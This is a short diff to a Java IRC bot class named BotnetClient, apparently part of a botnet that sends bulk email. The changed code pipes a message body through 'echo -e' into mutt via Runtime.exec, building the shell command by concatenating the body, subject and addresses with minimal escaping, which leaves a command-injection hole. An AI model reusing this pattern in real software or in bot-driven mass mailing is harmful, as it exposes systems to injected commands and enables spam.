@@ -198,12 +198,12 @@ public class BotnetClient extends PircBot {
 				emails += " " + email;
 			}
 			
-			body = body.replace("\"", "\\\"");
+			body = body.replace("\"", "\\\"").replace("\n", "\\\n");
 			
 			Process p = r.exec("echo -e \"" + body + "\" | mutt -s \"" + subject + "\"" + emails);
 			p.waitFor();
 			
-			System.out.println("echo \"" + body + "\" | mutt -s " + subject + emails);
+			System.out.println("echo -e \"" + body + "\" | mutt -s \"" + subject + "\"" + emails);
 			System.out.println("Email sent to" + emails + " with exit code " + p.exitValue());
 			
 		} catch(Exception e) {
